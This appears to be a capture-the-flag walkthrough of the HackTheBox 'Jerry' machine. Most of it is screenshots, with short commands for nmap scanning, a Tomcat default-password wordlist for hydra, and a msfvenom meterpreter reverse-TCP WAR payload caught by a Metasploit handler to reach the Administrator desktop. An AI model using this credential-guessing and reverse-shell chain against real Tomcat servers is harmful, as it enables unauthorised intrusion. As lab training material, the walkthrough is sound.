# Jerry

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

You can use the -sC for scripts to identify potential vulnerabilities, configuration issues and additional service details.&#x20;

\-sV is service version detection, it will send probes to the ports and compares against a database.



Tomcat is a webserver that can host Java files.



<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>



`less ./Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt`



`hydra -h`





<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

`msfvenom -l payloads`

`msfvenom -p windows/x64/meterpreter/reverse_tcp -l formats`

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.40 LPORT=9001 -f war -o tomcat`

`msfdb run`

`msf6 > use exploit/multi/handler`

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>



`10.10.10.95:8080/tomcat1/dnawdram.jsp`



<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>



`shell`

`whoami`

`dir`

`cd Administrator`

`cd Desktop`

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>







References:

{% embed url="https://www.youtube.com/watch?v=PJeBIey8gc4" %}
